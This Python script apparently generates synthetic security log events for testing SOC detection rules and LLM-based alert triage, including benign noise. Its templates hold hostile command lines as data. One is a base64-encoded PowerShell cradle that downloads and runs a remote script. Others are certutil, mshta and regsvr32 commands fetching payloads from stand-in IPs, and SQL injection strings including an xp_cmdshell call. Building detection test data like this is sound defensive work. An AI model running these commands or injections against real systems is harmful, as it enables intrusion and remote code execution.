"""
experiments/evaluation/soc_integration/generate_events.py

Programmatically generates synthetic_events.jsonl at scale, replacing the
original 28 hand-written events (9 incidents) with a larger, systematically
varied set. Encodes each of the 7 vendored rules' trigger conditions
(thresholds/windows/regexes, read directly from vendored_rules/*.yml) so
generated events reliably fire the intended rule, then varies entities
(hosts/IPs/users) and payload content to avoid every incident of a given
rule type looking identical to the LLM.

Deterministic: fixed random seed, so re-running reproduces the same file.

Usage:
    python -m experiments.evaluation.soc_integration.generate_events
"""

import base64
import json
import random
from datetime import datetime, timedelta, timezone

SEED = 42
PER_RULE = 10           # single-rule incidents per rule type (7 rules)
N_CHAINS_FULL = 2       # PROC-ENC-PS + PROC-LOLBIN + NET-C2 + NET-EXFIL, same host
N_CHAINS_PARTIAL = 2    # PROC-LOLBIN + NET-C2, same host
N_CHAINS_RECON = 2      # WEB-SQLI + AUTH-BRUTE, same src_ip
N_BENIGN = 40

HERE = __import__("pathlib").Path(__file__).parent
OUT_PATH = HERE / "synthetic_events.jsonl"

random.seed(SEED)

BASE_TIME = datetime(2026, 8, 8, 8, 0, 0, tzinfo=timezone.utc)

HOSTS = (
    [f"web-app-{i:02d}" for i in range(1, 16)]
    + [f"fin-ops-{i:02d}" for i in range(1, 11)]
    + [f"db-prod-{i:02d}" for i in range(1, 11)]
    + [f"ws-dev-{i:02d}" for i in range(1, 16)]
    + [f"ws-mktg-{i:02d}" for i in range(1, 11)]
    + [f"hr-portal-{i:02d}" for i in range(1, 7)]
    + [f"vpn-gw-{i:02d}" for i in range(1, 7)]
    + [f"iot-cam-{i:02d}" for i in range(1, 11)]
    + [f"api-gw-{i:02d}" for i in range(1, 7)]
    + [f"backup-srv-{i:02d}" for i in range(1, 7)]
)
random.shuffle(HOSTS)

USERNAMES = [
    "root", "admin", "administrator", "test", "oracle", "postgres", "ubuntu",
    "ec2-user", "guest", "sa", "deploy", "backup", "jenkins", "svc_account",
    "www-data", "developer", "support",
]

LOLBIN_TEMPLATES = [
    "certutil.exe -urlcache -split -f http://{ip}/stage2.bin s2.bin",
    "certutil.exe -decode C:\\Users\\Public\\payload.txt payload.exe",
    "mshta.exe http://{ip}/loader.hta",
    'mshta.exe javascript:eval("var x=new ActiveXObject(\'WScript.Shell\');x.Run(\'calc.exe\')")',
    "regsvr32.exe /s /n /u /i:http://{ip}/x.sct scrobj.dll",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"new ActiveXObject('WScript.Shell')\")",
]

SQLI_TEMPLATES = [
    "GET /login.php?user=admin' OR 1=1--&pass=x",
    "POST /search.php body=q=' UNION SELECT username,password FROM users--",
    "GET /product.php?id=1' AND SLEEP(5)--",
    "POST /account.php body=id=1'; EXEC xp_cmdshell('whoami')--",
    "GET /report.php?id=-1' UNION SELECT NULL,NULL,NULL--",
    "GET /item.php?id=7 OR 1=1#",
]

# --- external / attacker address pools (RFC 5737 documentation ranges) ---
ATTACKER_IPS = [f"198.51.100.{i}" for i in range(2, 255)] + [f"203.0.113.{i}" for i in range(2, 255)]
random.shuffle(ATTACKER_IPS)
DEST_IPS = [f"192.0.2.{i}" for i in range(2, 255)]
random.shuffle(DEST_IPS)
INTERNAL_IPS = [f"10.0.0.{i}" for i in range(2, 255)]
random.shuffle(INTERNAL_IPS)

C2_PORTS = [4444, 5555, 6666, 1337, 31337]

events = []
_attacker_i = _dest_i = _internal_i = _host_i = 0


def next_attacker_ip():
    global _attacker_i
    ip = ATTACKER_IPS[_attacker_i]
    _attacker_i += 1
    return ip


def next_dest_ip():
    global _dest_i
    ip = DEST_IPS[_dest_i]
    _dest_i += 1
    return ip


def next_internal_ip():
    global _internal_i
    ip = INTERNAL_IPS[_internal_i]
    _internal_i += 1
    return ip


def next_host():
    global _host_i
    h = HOSTS[_host_i]
    _host_i += 1
    return h


def emit(ts, **fields):
    row = {"timestamp": ts.strftime("%Y-%m-%dT%H:%M:%SZ")}
    row.update(fields)
    events.append(row)


def encoded_ps_payload(host_url):
    script = f"IEX (New-Object Net.WebClient).DownloadString('http://{host_url}/x.ps1')"
    return base64.b64encode(script.encode("utf-16-le")).decode()


# ---------------------------------------------------------------------
# 1. AUTH-BRUTE-001: 5+ failed logons, same src_ip, within 60s
# ---------------------------------------------------------------------
for _ in range(PER_RULE):
    host = next_host()
    attacker = next_attacker_ip()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    n_attempts = random.randint(5, 7)
    for i in range(n_attempts):
        emit(
            t0 + timedelta(seconds=i * 10),
            source="sshd", category="authentication", action="logon",
            outcome="failure", host=host,
            user=random.choice(USERNAMES), src_ip=attacker,
        )

# ---------------------------------------------------------------------
# 2. AUTH-SPRAY-001: 8+ failed logons, same src_ip, within 300s
#    (spaced 35s apart so it never also trips AUTH-BRUTE's 5-in-60s window)
# ---------------------------------------------------------------------
for _ in range(PER_RULE):
    host = next_host()
    attacker = next_attacker_ip()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    n_attempts = random.randint(8, 10)
    for i in range(n_attempts):
        emit(
            t0 + timedelta(seconds=i * 35),
            source="sshd", category="authentication", action="logon",
            outcome="failure", host=host,
            user=random.choice(USERNAMES), src_ip=attacker,
        )

# ---------------------------------------------------------------------
# 3. NET-EXFIL-001: single connection, bytes_out > 50MB
# ---------------------------------------------------------------------
for _ in range(PER_RULE):
    host = next_host()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    emit(
        t0, source="netflow", category="network", action="connection",
        host=host, dest_ip=next_dest_ip(), dest_port=random.choice([443, 8443, 21, 22]),
        bytes_out=random.randint(60_000_000, 800_000_000),
    )

# ---------------------------------------------------------------------
# 4. NET-C2-PORT-001: outbound connection to a known C2 port
# ---------------------------------------------------------------------
for _ in range(PER_RULE):
    host = next_host()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    emit(
        t0, source="netflow", category="network", action="connection",
        host=host, dest_ip=next_dest_ip(), dest_port=random.choice(C2_PORTS),
        bytes_out=random.randint(1000, 50000),
    )

# ---------------------------------------------------------------------
# 5. WEB-SQLI-001: SQLi marker in web request, entity=src_ip
# ---------------------------------------------------------------------
for _ in range(PER_RULE):
    attacker = next_attacker_ip()
    host = next_host()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    emit(
        t0, source="nginx", category="web", action="http_request",
        host=host, src_ip=attacker, message=random.choice(SQLI_TEMPLATES),
    )

# ---------------------------------------------------------------------
# 6. PROC-ENC-PS-001: powershell with an encoded command
# ---------------------------------------------------------------------
for _ in range(PER_RULE):
    host = next_host()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    emit(
        t0, source="edr", category="process", action="process_start",
        host=host, process="powershell.exe",
        command_line=f"powershell.exe -nop -w hidden -enc {encoded_ps_payload(next_dest_ip())}",
    )

# ---------------------------------------------------------------------
# 7. PROC-LOLBIN-001: LOLbin abuse
# ---------------------------------------------------------------------
for _ in range(PER_RULE):
    host = next_host()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    template = random.choice(LOLBIN_TEMPLATES)
    cmd = template.format(ip=next_dest_ip()) if "{ip}" in template else template
    proc = cmd.split(".exe")[0].split("\\")[-1] + ".exe"
    emit(
        t0, source="edr", category="process", action="process_start",
        host=host, process=proc, command_line=cmd,
    )

# ---------------------------------------------------------------------
# 8. Chained incidents (multi-rule, same entity, within correlator's 900s window)
# ---------------------------------------------------------------------
for _ in range(N_CHAINS_FULL):
    host = next_host()
    c2_dest = next_dest_ip()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    emit(t0, source="edr", category="process", action="process_start", host=host,
         process="powershell.exe",
         command_line=f"powershell.exe -nop -w hidden -enc {encoded_ps_payload(c2_dest)}")
    emit(t0 + timedelta(minutes=1), source="edr", category="process", action="process_start",
         host=host, process="certutil.exe",
         command_line=f"certutil.exe -urlcache -split -f http://{c2_dest}/stage2.bin s2.bin")
    emit(t0 + timedelta(minutes=2), source="netflow", category="network", action="connection",
         host=host, dest_ip=c2_dest, dest_port=random.choice(C2_PORTS), bytes_out=random.randint(1000, 20000))
    emit(t0 + timedelta(minutes=4), source="netflow", category="network", action="connection",
         host=host, dest_ip=c2_dest, dest_port=443, bytes_out=random.randint(60_000_000, 400_000_000))

for _ in range(N_CHAINS_PARTIAL):
    host = next_host()
    c2_dest = next_dest_ip()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    template = random.choice(LOLBIN_TEMPLATES)
    cmd = template.format(ip=c2_dest) if "{ip}" in template else template
    proc = cmd.split(".exe")[0].split("\\")[-1] + ".exe"
    emit(t0, source="edr", category="process", action="process_start", host=host, process=proc, command_line=cmd)
    emit(t0 + timedelta(minutes=1), source="netflow", category="network", action="connection",
         host=host, dest_ip=c2_dest, dest_port=random.choice(C2_PORTS), bytes_out=random.randint(1000, 20000))

for _ in range(N_CHAINS_RECON):
    attacker = next_attacker_ip()
    host = next_host()
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    emit(t0, source="nginx", category="web", action="http_request",
         host=host, src_ip=attacker, message=random.choice(SQLI_TEMPLATES))
    for i in range(random.randint(5, 6)):
        emit(t0 + timedelta(minutes=1, seconds=i * 10),
             source="sshd", category="authentication", action="logon", outcome="failure",
             host=host, user=random.choice(USERNAMES), src_ip=attacker)

# ---------------------------------------------------------------------
# 9. Benign noise (successful logins, ordinary process/web/network activity)
# ---------------------------------------------------------------------
BENIGN_PROCS = ["outlook.exe", "excel.exe", "chrome.exe", "teams.exe", "slack.exe", "zoom.exe", "code.exe"]
for _ in range(N_BENIGN):
    kind = random.choice(["login", "process", "web", "network"])
    t0 = BASE_TIME + timedelta(minutes=random.randint(0, 5000))
    host = random.choice(HOSTS)
    if kind == "login":
        emit(t0, source="sshd", category="authentication", action="logon", outcome="success",
             host=host, user=random.choice(USERNAMES), src_ip=next_internal_ip())
    elif kind == "process":
        emit(t0, source="edr", category="process", action="process_start", host=host,
             process=random.choice(BENIGN_PROCS), command_line=random.choice(BENIGN_PROCS))
    elif kind == "web":
        emit(t0, source="nginx", category="web", action="http_request", host=host,
             src_ip=next_internal_ip(), message="GET /dashboard?view=summary HTTP/1.1")
    else:
        emit(t0, source="netflow", category="network", action="connection", host=host,
             dest_ip=next_dest_ip(), dest_port=random.choice([80, 443, 22]),
             bytes_out=random.randint(1000, 5_000_000))

events.sort(key=lambda e: e["timestamp"])

with open(OUT_PATH, "w") as f:
    for e in events:
        f.write(json.dumps(e) + "\n")

print(f"Wrote {len(events)} events to {OUT_PATH}")
